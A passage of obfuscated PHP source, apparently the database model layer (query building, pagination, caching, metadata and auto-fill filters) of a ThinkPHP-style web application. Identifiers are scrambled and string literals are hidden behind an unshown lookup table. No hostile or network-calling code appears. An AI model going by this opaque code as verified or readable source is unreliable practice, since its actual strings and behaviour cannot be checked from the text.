$∏‰◊øŸó[$ô™∂¥‚¬]->close(); unset($∏‰◊øŸó[$ô™∂¥‚¬]); return; } if (!empty($ÙÎÒﬁÑ†)) { if (is_string($ÙÎÒﬁÑ†)) { parse_str($ÙÎÒﬁÑ†, $ÙÎÒﬁÑ†); } foreach ($ÙÎÒﬁÑ† as $‚âò√Æ => $® Êïöö) { $this->setProperty($‚âò√Æ, $® Êïöö); } } $ÍØ¸√÷è[$ô™∂¥‚¬] = $ÎÈøÉ˝; $this->db = $∏‰◊øŸó[$ô™∂¥‚¬]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $≤íÓ’ö· = get_class($this); if ($≤íÓ’ö· == $_SERVER[ëæªã÷][350]) { return $this->name; } $this->name = substr($≤íÓ’ö·, 0, -5); } return $this->name; } public function getTableName() { $¸é≈ßëú =& $_SERVER[ëæªã÷]; if (empty($this->trueTableName)) { $§ﬂµ≠⁄œ = !empty($this->tablePrefix) ? $this->tablePrefix : $¸é≈ßëú[12]; if (!empty($this->tableName)) { $§ﬂµ≠⁄œ .= $this->tableName; } else { $§ﬂµ≠⁄œ .= think_parse_name($this->name); } $this->trueTableName = strtolower($§ﬂµ≠⁄œ); } return (!empty($this->dbName) ? $this->dbName . $¸é≈ßëú[10] : $¸é≈ßëú[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ì€õ°ˆ˛ =& $_SERVER[ëæªã÷]; return isset($this->fields[$ì€õ°ˆ˛[255]]) ? $this->fields[$ì€õ°ˆ˛[255]] : $this->pk; } public function getDbFields() { $⁄≠»∆«ä =& $_SERVER[ëæªã÷]; if (isset($this->options[$⁄≠»∆«ä[283]])) { $Ûﬁ¥Éõ± = $this->db->getFields($this->options[$⁄≠»∆«ä[283]]); return $Ûﬁ¥Éõ± ? array_keys($Ûﬁ¥Éõ±) : !1; } if ($this->fields) { $Ûﬁ¥Éõ± = $this->fields; unset($Ûﬁ¥Éõ±[$⁄≠»∆«ä[254]], $Ûﬁ¥Éõ±[$⁄≠»∆«ä[255]], $Ûﬁ¥Éõ±[$⁄≠»∆«ä[256]], $Ûﬁ¥Éõ±[$⁄≠»∆«ä[253]]); return $Ûﬁ¥Éõ±; } return !1; } public function data($–∫§æ¨Ô = '') { $ôíÊÆ˛ñ =& $_SERVER[ëæªã÷]; if ($ôíÊÆ˛ñ[12] === $–∫§æ¨Ô && !empty($this->data)) { return $this->data; } if (is_object($–∫§æ¨Ô)) { $–∫§æ¨Ô = get_object_vars($–∫§æ¨Ô); } elseif (is_string($–∫§æ¨Ô)) { parse_str($–∫§æ¨Ô, $–∫§æ¨Ô); } elseif (!is_array($–∫§æ¨Ô)) { think_exception(think_lang($ôíÊÆ˛ñ[275])); } $this->data = $–∫§æ¨Ô; return $this; } public function join($±Óäö≤¯) { $Ø”„ÈÕ∆ =& $_SERVER[ëæªã÷]; if (is_array($±Óäö≤¯)) { $this->options[$Ø”„ÈÕ∆[286]] = $±Óäö≤¯; } elseif (!empty($±Óäö≤¯)) { $this->options[$Ø”„ÈÕ∆[286]][] = $±Óäö≤¯; } return $this; } public function union($„Ï°´û∑, $ä‹·èÎú = false) { $ü¸Û…„ù =& $_SERVER[ëæªã÷]; if (empty($„Ï°´û∑)) { return $this; } if ($ä‹·èÎú) { $this->options[$ü¸Û…„ù[351]][$ü¸Û…„ù[352]] = !0; } if (is_object($„Ï°´û∑)) { $„Ï°´û∑ = get_object_vars($„Ï°´û∑); } if (is_string($„Ï°´û∑)) { $Á”õÈΩò = $„Ï°´û∑; } elseif (is_array($„Ï°´û∑)) { if (isset($„Ï°´û∑[0])) { $this->options[$ü¸Û…„ù[351]] = array_merge($this->options[$ü¸Û…„ù[351]], $„Ï°´û∑); return $this; } else { $Á”õÈΩò = $„Ï°´û∑; } } else { think_exception(think_lang($ü¸Û…„ù[275])); } $this->options[$ü¸Û…„ù[351]][] = $Á”õÈΩò; return $this; } public function cache($ó‹Ôç˘ = true, $µë•À¶ = null, $Å›∑îµ = '') { $–…Ø„è“ =& $_SERVER[ëæªã÷]; if (!1 !== $ó‹Ôç˘) { $this->options[$–…Ø„è“[353]] = array($–…Ø„è“[105] => $ó‹Ôç˘, $–…Ø„è“[343] => $µë•À¶, $–…Ø„è“[33] => $Å›∑îµ); } return $this; } public function field($‚î«‰Ìç, $èÇ©≠©‰ = false) { $Õ¶Æ±õ∑ =& $_SERVER[ëæªã÷]; if (!0 === $‚î«‰Ìç) { $⁄˘∆Ø‹û = $this->getDbFields(); $‚î«‰Ìç = $⁄˘∆Ø‹û ? $⁄˘∆Ø‹û : $Õ¶Æ±õ∑[191]; } elseif ($èÇ©≠©‰) { if (is_string($‚î«‰Ìç)) { $‚î«‰Ìç = explode($Õ¶Æ±õ∑[50], $‚î«‰Ìç); } $⁄˘∆Ø‹û = $this->getDbFields(); $‚î«‰Ìç = $⁄˘∆Ø‹û ? array_diff($⁄˘∆Ø‹û, $‚î«‰Ìç) : $‚î«‰Ìç; } $this->options[$Õ¶Æ±õ∑[277]] = $‚î«‰Ìç; return $this; } public function scope($ùÃΩÇå‡ = '', $£˙ÏÇŸ∏ = NULL) { $À‡à–ú¢ =& $_SERVER[ëæªã÷]; if ($À‡à–ú¢[12] === $ùÃΩÇå‡) { if (isset($this->_scope[$À‡à–ú¢[37]])) { $·€ªùÇø = $this->_scope[$À‡à–ú¢[37]]; } else { return $this; } } elseif (is_string($ùÃΩÇå‡)) { $•å†–Äÿ = explode($À‡à–ú¢[50], $ùÃΩÇå‡); $·€ªùÇø = array(); foreach ($•å†–Äÿ as $òæÆÂ‹®) { if (!isset($this->_scope[$òæÆÂ‹®])) { continue; } $·€ªùÇø = array_merge($·€ªùÇø, $this->_scope[$òæÆÂ‹®]); } if (!empty($£˙ÏÇŸ∏) && is_array($£˙ÏÇŸ∏)) { $·€ªùÇø = array_merge($·€ªùÇø, $£˙ÏÇŸ∏); } } elseif (is_array($ùÃΩÇå‡)) { $·€ªùÇø = $ùÃΩÇå‡; } if (is_array($·€ªùÇø) && !empty($·€ªùÇø)) { $this->options = array_merge($this->options, array_change_key_case($·€ªùÇø)); } return $this; } public function where($“‚¢ÊÇ‰, $–ñ±‚Ÿ¶ = null) { $ïçÚÎÔ◊ =& $_SERVER[ëæªã÷]; if (!is_null($–ñ±‚Ÿ¶) && is_string($“‚¢ÊÇ‰)) { if (!is_array($–ñ±‚Ÿ¶)) { $–ñ±‚Ÿ¶ = func_get_args(); array_shift($–ñ±‚Ÿ¶); } $–ñ±‚Ÿ¶ = array_map(array($this->db, $ïçÚÎÔ◊[347]), $–ñ±‚Ÿ¶); $“‚¢ÊÇ‰ = vsprintf($“‚¢ÊÇ‰, $–ñ±‚Ÿ¶); } elseif (is_object($“‚¢ÊÇ‰)) { $“‚¢ÊÇ‰ = get_object_vars($“‚¢ÊÇ‰); } elseif (is_array($“‚¢ÊÇ‰)) { foreach ($“‚¢ÊÇ‰ as $£ÿ°Ê∫ﬁ => $Ÿ¨ë„Ãá) { if ((is_numeric($£ÿ°Ê∫ﬁ) || !$£ÿ°Ê∫ﬁ) && is_string($Ÿ¨ë„Ãá)) { if (strpos($Ÿ¨ë„Ãá, $ïçÚÎÔ◊[354]) === 0) { continue; } think_trace($ïçÚÎÔ◊[355], $ïçÚÎÔ◊[12], $ïçÚÎÔ◊[49]); die; } } } if (is_string($“‚¢ÊÇ‰) && $ïçÚÎÔ◊[12] != $“‚¢ÊÇ‰) { $áùñıäˆ = array(); $áùñıäˆ[$ïçÚÎÔ◊[356]] = $“‚¢ÊÇ‰; $“‚¢ÊÇ‰ = $áùñıäˆ; } if (isset($this->options[$ïçÚÎÔ◊[279]])) { $this->options[$ïçÚÎÔ◊[279]] = array_merge($this->options[$ïçÚÎÔ◊[279]], $“‚¢ÊÇ‰); } else { $this->options[$ïçÚÎÔ◊[279]] = $“‚¢ÊÇ‰; } return $this; } public function limit($õÔ¬∑≠€, $—œ¢ÚÁó = null) { $»¿´˘©ä =& $_SERVER[ëæªã÷]; $this->options[$»¿´˘©ä[296]] = is_null($—œ¢ÚÁó) ? $õÔ¬∑≠€ : $õÔ¬∑≠€ . $»¿´˘©ä[50] . $—œ¢ÚÁó; return $this; } public function page($ÂêœÈ≤√, $ÚŒÜ»—œ = null) { $›ﬂ¿Ì”œ =& $_SERVER[ëæªã÷]; $this->options[$›ﬂ¿Ì”œ[357]] = is_null($ÚŒÜ»—œ) ? $ÂêœÈ≤√ : $ÂêœÈ≤√ . $›ﬂ¿Ì”œ[50] . $ÚŒÜ»—œ; return $this; } public function comment($ÒÇŒµÕÊ) { $this->options[$_SERVER[ëæªã÷][358]] = $ÒÇŒµÕÊ; return $this; } public function setProperty($ÅÚº¶Ì±, $Å∫œ˛’˘) { if (property_exists($this, $ÅÚº¶Ì±)) { $this->{$ÅÚº¶Ì±} = $Å∫œ˛’˘; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\144\151\146\x79\x54\x69\x6d\145", "\x74\151\x6d\x65", "\x69\x6e\x73\x65\162\164\x2c\x75\x70\144\141\164\145", "\146\x75\156\x63\164\151\x6f\156"), array("\x63\162\145\x61\164\145\124\x69\155\145", "\164\151\155\x65", "\x69\x6e\x73\145\x72\x74", "\146\x75\x6e\x63\x74\151\157\156")); public function setDataAuto($úÒÜéﬁ≠) { $this->dataAuto = $úÒÜéﬁ≠; } public function __construct($£¥Ôﬂ˙Ô = '', $¶™ùÏÁ˛ = '', $»ãÄˆ«— = '') { parent::__construct($£¥Ôﬂ˙Ô, $¶™ùÏÁ˛, $»ãÄˆ«—); } protected $tableMeta = array(); protected function _beforeInsert(&$ÚãπÖ‰Ô, $ò¨öª€ﬁ) { $´»ã°∞Ø =& $_SERVER[ëæªã÷]; if (!$this->checkDataAutoHas($´»ã°∞Ø[359])) { return; } $this->dataBeforeFilter($ÚãπÖ‰Ô, $´»ã°∞Ø[359]); } protected function _beforeUpdate(&$¯‡áä¶», $´É—£¸£) { $⁄˙ëÆÿ˙ =& $_SERVER[ëæªã÷]; if (!$this->checkDataAutoHas($⁄˙ëÆÿ˙[360])) { return; } $this->dataBeforeFilter($¯‡áä¶», $⁄˙ëÆÿ˙[360]); } protected function _afterSelect(&$°÷≥Úê¶, $≠˙„¸ÿî) { if (!is_array($°÷≥Úê¶)) { return; } if (!$this->checkDataAutoHas($_SERVER[ëæªã÷][361])) { return; } foreach ($°÷≥Úê¶ as &$˝»Û∆µÂ) { $this->dataAfterFilter($˝»Û∆µÂ); } unset($˝»Û∆µÂ); } protected function _afterFind(&$í„€÷√Ñ, $—´¯ÂÕœ) { if (!is_array($í„€÷√Ñ)) { return; } if (!$this->checkDataAutoHas($_SERVER[ëæªã÷][361])) { return; } $this->dataAfterFilter($í„€÷√Ñ); } public static function textEncode($ÑÇè÷ÒÇ) { if (!$ÑÇè÷ÒÇ) { return $ÑÇè÷ÒÇ; } $œÓÓãÔ∞ = json_encode($ÑÇè÷ÒÇ); $œÓÓãÔ∞ = preg_replace_callback($_SERVER[ëæªã÷][362], function ($¥«»∏¿õ) { return addslashes($¥«»∏¿õ[0]); }, $œÓÓãÔ∞); return json_decode($œÓÓãÔ∞); } public static function textDecode($∫ã’’≠¸) { $πÕÏáå‚ =& $_SERVER[ëæªã÷]; $Ñª∫µ˛ï = json_encode($∫ã’’≠¸); $Ñª∫µ˛ï = preg_replace_callback($πÕÏáå‚[363], function ($ˆù‡Ïáª) { return $_SERVER[ëæªã÷][108]; }, $Ñª∫µ˛ï); return json_decode($Ñª∫µ˛ï); } public function setAutoIncrement($úÆΩÓûä) { $é›ﬂÈöÚ = array($this->getPk() => $úÆΩÓûä); $‘Ö®ÍŒÀ = $this->data($é›ﬂÈöÚ)->add(); if ($‘Ö®ÍŒÀ) { $this->delete($‘Ö®ÍŒÀ); } } public function getAutoIncrement() { $Ÿ≈¨¡º… = $this->getTableName(); $¢éÇÒº = $this->max($this->getPk()); $Ù‡∂ÿÀÌ = $this->query("\x73\150\x6f\x77\40\164\141\x62\x6c\145\x20\163\164\141\164\165\163\x20\167\x68\145\x72\x65\x20\116\x61\x6d\145\x3d\x27{$Ÿ≈¨¡º…}\47"); $¶ùÂúúô = $Ù‡∂ÿÀÌ[0][$_SERVER[ëæªã÷][364]]; $ìπ¿èÍ˛ = max($¢éÇÒº, $¶ùÂúúô); return $ìπ¿èÍ˛; } protected function _callBefore($ êÃª‘¬, $•∏ì–åÊ) { return $this->cacheCallCheck($ êÃª‘¬, $•∏ì–åÊ, !1); } protected function _callAfter($«Æû›åÂ, $æ∑≥™çÁ) { return $this->cacheCallCheck($«Æû›åÂ, $æ∑≥™çÁ, !0); } protected function cacheFunctionAlias($«ƒØÄ¸˚) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ÅΩ§¨¶“, $û∞åÙˆË, $ÿÑ‹∞Æ˛ = false) { $∆ùﬂçπ° = $this->cacheFunctionAlias($û∞åÙˆË); if (!$∆ùﬂçπ°) { return; } foreach ($∆ùﬂçπ° as $§“Œ÷Œ¯ => $µè‚Ç˝™) { $Ωòø‘øﬂ = $µè‚Ç˝™[0]; $òæ›áû∏ = explode($_SERVER[ëæªã÷][50], $µè‚Ç˝™[1]); if ($ÅΩ§¨¶“ == $§“Œ÷Œ¯) { return $this->cacheFunctionGet($§“Œ÷Œ¯, $Ωòø‘øﬂ); } if ($ÿÑ‹∞Æ˛ && in_array($ÅΩ§¨¶“, $òæ›áû∏)) { $this->cacheFunctionClear($§“Œ÷Œ¯, $Ωòø‘øﬂ); } } } public function cacheFunctionGet($…⁄âÓ™ö, $≤∑√≤π„) { $Ö˜˚‹è‘ = $this->cacheKeyMake($…⁄âÓ™ö, $≤∑√≤π„); $ààƒö‡ = Cache::get($Ö˜˚‹è‘); if (!is_array($ààƒö‡)) { $ààƒö‡ = call_user_func_array(array($this, $…⁄âÓ™ö), array($≤∑√≤π„, !0)); Cache::set($Ö˜˚‹è‘, $ààƒö‡); } return $ààƒö‡; } public function cacheFunctionClear($£ûÎÒŸ¢, $∞ì≈€¡å) { $√°œ®ÃÔ = $∞ì≈€¡å; if (!is_array($∞ì≈€¡å)) { $√°œ®ÃÔ = array($∞ì≈€¡å); } foreach ($√°œ®ÃÔ as $√◊ËÜÛÀ) { $¸⁄üÿå¡ = $this->cacheKeyMake($£ûÎÒŸ¢, $√◊ËÜÛÀ); Cache::remove($¸⁄üÿå¡); } } private function cacheKeyMake($ãçã»¨‹, $ÿ˛Ÿ·≥ã) { $¶§˙‡€Ï =& $_SERVER[ëæªã÷]; return get_class($this) . $¶§˙‡€Ï[11] . $ãçã»¨‹ . $¶§˙‡€Ï[365] . $ÿ˛Ÿ·≥ã; } protected function selectPageReset() { $È¶ﬁ⁄∏® =& $_SERVER[ëæªã÷]; if (isset($GLOBALS[$È¶ﬁ⁄∏®[366]])) { return; } $GLOBALS[$È¶ﬁ⁄∏®[366]] = isset($GLOBALS[$È¶ﬁ⁄∏®[7]][$È¶ﬁ⁄∏®[367]]) ? $GLOBALS[$È¶ﬁ⁄∏®[7]][$È¶ﬁ⁄∏®[367]] : !1; $GLOBALS[$È¶ﬁ⁄∏®[368]] = isset($GLOBALS[$È¶ﬁ⁄∏®[7]][$È¶ﬁ⁄∏®[357]]) ? $GLOBALS[$È¶ﬁ⁄∏®[7]][$È¶ﬁ⁄∏®[357]] : !1; $GLOBALS[$È¶ﬁ⁄∏®[7]][$È¶ﬁ⁄∏®[367]] = !1; $GLOBALS[$È¶ﬁ⁄∏®[7]][$È¶ﬁ⁄∏®[357]] = !1; } protected function selectPageRestore() { $ü¯˜÷Õ“ =& $_SERVER[ëæªã÷]; if (!isset($GLOBALS[$ü¯˜÷Õ“[366]])) { return; } $GLOBALS[$ü¯˜÷Õ“[7]][$ü¯˜÷Õ“[367]] = $GLOBALS[$ü¯˜÷Õ“[366]]; $GLOBALS[$ü¯˜÷Õ“[7]][$ü¯˜÷Õ“[357]] = $GLOBALS[$ü¯˜÷Õ“[368]]; if ($GLOBALS[$ü¯˜÷Õ“[7]][$ü¯˜÷Õ“[367]] === !1) { unset($GLOBALS[$ü¯˜÷Õ“[7]][$ü¯˜÷Õ“[367]]); } if ($GLOBALS[$ü¯˜÷Õ“[7]][$ü¯˜÷Õ“[357]] === !1) { unset($GLOBALS[$ü¯˜÷Õ“[7]][$ü¯˜÷Õ“[357]]); } unset($GLOBALS[$ü¯˜÷Õ“[366]]); unset($GLOBALS[$ü¯˜÷Õ“[368]]); } protected function selectPage($ø‰∂›Ùµ = 200, $ô ñéûÎ = 1) { $çö˜ÎœØ =& $_SERVER[ëæªã÷]; global $in; $¨…ŸæëÔ = $this->optionsValue(); $◊û‚Ö∂ã = 50000; $ø‰∂›Ùµ = isset($in[$çö˜ÎœØ[367]]) && $in[$çö˜ÎœØ[367]] ? $in[$çö˜ÎœØ[367]] : $ø‰∂›Ùµ; if ($ø‰∂›Ùµ === -1) { $in[$çö˜ÎœØ[367]] = !1; $◊û‚Ö∂ã = 100000000; $ø‰∂›Ùµ = $◊û‚Ö∂ã; } $⁄ûí•Âπ = $¨…ŸæëÔ; $⁄ûí•Âπ[$çö˜ÎœØ[369]] = array(); $ø‰∂›Ùµ = intval($ø‰∂›Ùµ); $ø‰∂›Ùµ = $ø‰∂›Ùµ <= 5 ? 5 : ($ø‰∂›Ùµ >= $◊û‚Ö∂ã ? $◊û‚Ö∂ã : $ø‰∂›Ùµ); $ô ñéûÎ = intval(isset($in[$çö˜ÎœØ[357]]) && $in[$çö˜ÎœØ[357]] ? $in[$çö˜ÎœØ[357]] : $ô ñéûÎ); $ô ñéûÎ = $ô ñéûÎ <= 1 ? 1 : $ô ñéûÎ; $Ω§Ùÿùä = array(); $Ã∂àÕƒ⁄ = 1; if ($ô ñéûÎ == 1 && $Ã∂àÕƒ⁄) { $this->optionsValue($¨…ŸæëÔ); $Ω§Ùÿùä = $this->page($ô ñéûÎ, $ø‰∂›Ùµ)->select(); $óÇ˜ãô¥ = is_array($Ω§Ùÿùä) ? count($Ω§Ùÿùä) : 0; if ($óÇ˜ãô¥ < $ø‰∂›Ùµ) { $çö˜€œÕ = 1; } else { $this->optionsValue($⁄ûí•Âπ); $óÇ˜ãô¥ = intval($this->count()); $çö˜€œÕ = ceil($óÇ˜ãô¥ / $ø‰∂›Ùµ); } } else { $this->optionsValue($⁄ûí•Âπ); $óÇ˜ãô¥ = intval($this->count()); $çö˜€œÕ = ceil($óÇ˜ãô¥ / $ø‰∂›Ùµ); $ô ñéûÎ = $ô ñéûÎ >= $çö˜€œÕ ? $çö˜€œÕ : $ô ñéûÎ; $this->optionsValue($¨…ŸæëÔ); $Ω§Ùÿùä = $this->page($ô ñéûÎ, $ø‰∂›Ùµ)->select(); } if (!is_array($Ω§Ùÿùä)) { $Ω§Ùÿùä = array(); } if ($çö˜€œÕ == 1) { $óÇ˜ãô¥ = count($Ω§Ùÿùä); } $◊’†®≥ê = array($çö˜ÎœØ[370] => array($çö˜ÎœØ[371] => $óÇ˜ãô¥, $çö˜ÎœØ[367] => $ø‰∂›Ùµ, $çö˜ÎœØ[357] => $ô ñéûÎ, $çö˜ÎœØ[372] => $çö˜€œÕ), $çö˜ÎœØ[373] => $Ω§Ùÿùä); return $◊’†®≥ê; } protected function checkLength($≈ÚØ∞∞∆, $√Ó“ª⁄≠ = 0, $ƒ¨Ãò∂ô = '') { $Ø∫Áı¸≈ =& $_SERVER[ëæªã÷]; $√Ó“ª⁄≠ = $√Ó“ª⁄≠ ? $√Ó“ª⁄≠ : 65536; if (!$≈ÚØ∞∞∆ || strlen($≈ÚØ∞∞∆) < $√Ó“ª⁄≠) { return; } $ƒ¨Ãò∂ô = $ƒ¨Ãò∂ô ? $ƒ¨Ãò∂ô . $Ø∫Áı¸≈[81] : $Ø∫Áı¸≈[12]; show_json($ƒ¨Ãò∂ô . LNG($Ø∫Áı¸≈[374]) . "\x28{$√Ó“ª⁄≠}\x29", !1); } protected function metaSet($Ö—Øà∂í, $ÂöõÚÆ÷ = null, $πÅôù¨é = null) { $˛›˜™∂ñ =& $_SERVER[ëæªã÷]; if (!$this->tableMeta || !$Ö—Øà∂í) { return !1; } $ê’ñƒùÛ = $this->tableMeta[$˛›˜™∂ñ[375]]; $»ØÚôΩˆ = $this->tableMeta[$˛›˜™∂ñ[376]]; $£ÒæÑ”Ÿ = Model($»ØÚôΩˆ); $Öñ∏π…¥ = array($ê’ñƒùÛ => $Ö—Øà∂í, $˛›˜™∂ñ[377] => $ÂöõÚÆ÷); if (is_null($ÂöõÚÆ÷)) { return $£ÒæÑ”Ÿ->where(array($ê’ñƒùÛ => $Ö—Øà∂í))->delete(); } if (is_null($πÅôù¨é) && is_string($ÂöõÚÆ÷)) { return $£ÒæÑ”Ÿ->where($Öñ∏π…¥)->delete(); } $ôºØ¯πÓ = is_array($ÂöõÚÆ÷) ? $ÂöõÚÆ÷ : array(); if (is_string($ÂöõÚÆ÷)) { $ôºØ¯πÓ[$ÂöõÚÆ÷] = $πÅôù¨é; } $ãÈ¶˚îÜ = array(); foreach ($ôºØ¯πÓ as $¯•û˝›£ => $Ùº—Å¿¨) { if (is_null($Ùº—Å¿¨) && is_string($¯•û˝›£)) { $£ÒæÑ”Ÿ->where(array($ê’ñƒùÛ => $Ö—Øà∂í, $˛›˜™∂ñ[377] => $¯•û˝›£))->delete(); continue; } $this->checkLength($Ùº—Å¿¨, !1, $»ØÚôΩˆ . $˛›˜™∂ñ[4] . $¯•û˝›£); $ãÈ¶˚îÜ[] = array($ê’ñƒùÛ => $Ö—Øà∂í, $˛›˜™∂ñ[105] => $¯•û˝›£, $˛›˜™∂ñ[378] => $Ùº—Å¿¨); } $¶◊ü„”— = $˛›˜™∂ñ[379] . $»ØÚôΩˆ; CacheLock::lock($¶◊ü„”—); $£ÒæÑ”Ÿ->where(array($ê’ñƒùÛ => $Ö—Øà∂í))->addAll($ãÈ¶˚îÜ, array(), !0); CacheLock::unlock($¶◊ü„”—); return !0; } public function metaGet($ƒÚ…Ú¬˘, $√Ñ™¿∫¥ = false) { $ŸÏÇ´Ã∫ =& $_SERVER[ëæªã÷]; if (!$this->tableMeta) { return array(); } $ô’°æÄ = $this->tableMeta[$ŸÏÇ´Ã∫[375]]; $”–´Éù˝ = Model($this->tableMeta[$ŸÏÇ´Ã∫[376]]); if ($√Ñ™¿∫¥) { $Â·çÓ◊˝ = array($ô’°æÄ => $ƒÚ…Ú¬˘, $ŸÏÇ´Ã∫[105] => $√Ñ™¿∫¥); return $”–´Éù˝->where($Â·çÓ◊˝)->getField($ŸÏÇ´Ã∫[378]); } $Â·çÓ◊˝ = array($ô’°æÄ => $ƒÚ…Ú¬˘); $¡ﬂﬁóäª = $”–´Éù˝->field($ŸÏÇ´Ã∫[380])->where($Â·çÓ◊˝)->select(); $¡ﬂﬁóäª = array_to_keyvalue($¡ﬂﬁóäª, $ŸÏÇ´Ã∫[105], $ŸÏÇ´Ã∫[378]); return $¡ﬂﬁóäª; } private function checkDataAutoHas($º˙√Ú†√) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $Êôªíˆ˘) { if (in_array($º˙√Ú†√, explode($_SERVER[ëæªã÷][50], $Êôªíˆ˘[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$Åõ«È«, $úƒÕñªÇ) { $ÛÉÀ£Ÿ∞ =& $_SERVER[ëæªã÷]; if (!is_array($Åõ«È«)) { return; } foreach ($this->dataAuto as $…•ûïÜÙ) { $˜Ç¶ñ¶ê = $…•ûïÜÙ[0]; if (!in_array($úƒÕñªÇ, explode($ÛÉÀ£Ÿ∞[50], $…•ûïÜÙ[2]))) { continue; } switch (trim($…•ûïÜÙ[3])) { case $ÛÉÀ£Ÿ∞[325]: case $ÛÉÀ£Ÿ∞[326]: $ö”„Ûéß = $…•ûïÜÙ[1]; $©∫ÿÚíÁ = isset($…•ûïÜÙ[4]) ? (array) $…•ûïÜÙ[4] : array(); if ($ö”„Ûéß == $ÛÉÀ£Ÿ∞[206] && array_key_exists($˜Ç¶ñ¶ê, $Åõ«È«)) { if (!$Åõ«È«[$˜Ç¶ñ¶ê]) { unset($Åõ«È«[$˜Ç¶ñ¶ê]); } break; } if (isset($Åõ«È«[$˜Ç¶ñ¶ê])) { array_unshift($©∫ÿÚíÁ, $Åõ«È«[$˜Ç¶ñ¶ê]); } if ($ÛÉÀ£Ÿ∞[325] == $…•ûïÜÙ[3]) { $Åõ«È«[$˜Ç¶ñ¶ê] = call_user_func_array($ö”„Ûéß, $©∫ÿÚíÁ); } else { $Åõ«È«[$˜Ç¶ñ¶ê] = call_user_func_array(array(&$this, $ö”„Ûéß), $©∫ÿÚíÁ); } break; case $ÛÉÀ£Ÿ∞[274]: if (isset($Åõ«È«[$˜Ç¶ñ¶ê]) && $Åõ«È«[$˜Ç¶ñ¶ê]) { $Åõ«È«[$˜Ç¶ñ¶ê] = call_user_func_array(array(&$this, $…•ûïÜÙ[1]), array($Åõ«È«[$˜Ç¶ñ¶ê])); } break; case $ÛÉÀ£Ÿ∞[277]: $Åõ«È«[$˜Ç¶ñ¶ê] = $Åõ«È«[$…•ûïÜÙ[1]]; break; case $ÛÉÀ£Ÿ∞[298]: if (isset($Åõ«È«[$˜Ç¶ñ¶ê]) && !is_string($Åõ«È«[$˜Ç¶ñ¶ê])) { $Åõ«È«[$˜Ç¶ñ¶ê] = json_encode_force($Åõ«È«[$˜Ç¶ñ¶ê]); } break; case $ÛÉÀ£Ÿ∞[327]: if ($Åõ«È«[$˜Ç¶ñ¶ê] === $ÛÉÀ£Ÿ∞[12]) { unset($Åõ«È«[$˜Ç¶ñ¶ê]); } break; case $ÛÉÀ£Ÿ∞[328]: $Åõ«È«[$˜Ç¶ñ¶ê] = $…•ûïÜÙ[1]; default: break; } } if ($úƒÕñªÇ == $ÛÉÀ£Ÿ∞[359]) { $Åç’¥›ó = strtolower($this->db->getDbType()); if (strpos($Åç’¥›ó, $ÛÉÀ£Ÿ∞[13]) !== 0) { return; } $ûßŒ˝ÑÊ = $this->field(!0)->fields; $Á∫≈´ãô = $ûßŒ˝ÑÊ[$ÛÉÀ£Ÿ∞[256]]; if (isset($ûßŒ˝ÑÊ[$ÛÉÀ£Ÿ∞[255]])) { unset($Á∫≈´ãô[$ûßŒ˝ÑÊ[$ÛÉÀ£Ÿ∞[255]]]); } foreach ($Á∫≈´ãô as $‰≤§–…Ø => $úƒÕñªÇ) { if (!isset($Åõ«È«[$‰≤§–…Ø])) { $Åõ«È«[$‰≤§–…Ø] = $ÛÉÀ£Ÿ∞[12]; } } } } private function dataAfterFilter(&$â®Â˘∫•) { $â≈õ®öô =& $_SERVER[ëæªã÷]; foreach ($this->dataAuto as $Ô¡ä›®å) { $•˚àÄáø = $Ô¡ä›®å[0]; if (!isset($â®Â˘∫•[$•˚àÄáø])) { continue; } if (!in_array($â≈õ®öô[361], explode($â≈õ®öô[50], $Ô¡ä›®å[2]))) { continue; } switch (trim($Ô¡ä›®å[3])) { case $â≈õ®öô[325]: case $â≈õ®öô[326]: $ÆÌ¯›∑¢ = isset($Ô¡ä›®å[4]) ? (array) $Ô¡ä›®å[4] : array(); array_unshift($ÆÌ¯›∑¢, $â®Â˘∫•[$•˚àÄáø]); if (isset($Ô¡ä›®å[4]) && $Ô¡ä›®å[4] == $â≈õ®öô[381]) { $ÆÌ¯›∑¢ = array($â®Â˘∫•[$•˚àÄáø]); } if ($â≈õ®öô[325] == $Ô¡ä›®å[3]) { $â®Â˘∫•[$•˚àÄáø] = call_user_func_array($Ô¡ä›®å[1], $ÆÌ¯›∑¢); } else { $â®Â˘∫•[$•˚àÄáø] = call_user_func_array(array(&$this, $Ô¡ä›®å[1]), $ÆÌ¯›∑¢); } break; case $â≈õ®öô[274]: if (isset($â®Â˘∫•[$•˚àÄáø]) && $â®Â˘∫•[$•˚àÄáø]) { $â®Â˘∫•[$•˚àÄáø] = call_user_func_array(array(&$this, $Ô¡ä›®å[1]), array($â®Â˘∫•[$•˚àÄáø])); } break; case $â≈õ®öô[277]: $â®Â˘∫•[$•˚àÄáø] = $â®Â˘∫•[$Ô¡ä›®å[1]]; break; case $â≈õ®öô[298]: $˜©≤Ãàô = $â®Â˘∫•[$•˚àÄáø]; $â®Â˘∫•[$•˚àÄáø] = json_decode($˜©≤Ãàô, !0); if (is_null($â®Â˘∫•[$•˚àÄáø])) { $â®Â˘∫•[$•˚àÄáø] = $˜©≤Ãàô; } break; case $â≈õ®öô[327]: if ($â®Â˘∫•[$•˚àÄáø] === $â≈õ®öô[12]) { unset($â®Â˘∫•[$•˚àÄáø]); } break; case $â≈õ®öô[328]: $â®Â˘∫•[$•˚àÄáø] = $Ô¡ä›®å[1]; break; default: break; } } } public function saveAll($¬∆˙€ŒÇ) { $îëæ˛ë’ =& $_SERVER[ëæªã÷]; $œ˝áßÓÜ = $this->tablePrefix . $this->tableName; $ä˙˚Ö≤à = self::SQL_WHERE_IN_CHUNK; $¬∆˙€ŒÇ = is_array($¬∆˙€ŒÇ) ? $¬∆˙€ŒÇ : array(); $≤–†çÉƒ = $îëæ˛ë’[382]; $Ò µ•ßô = 0; $ÖÓø˘ÍÆ = array(); $ú·ê©”∫ = 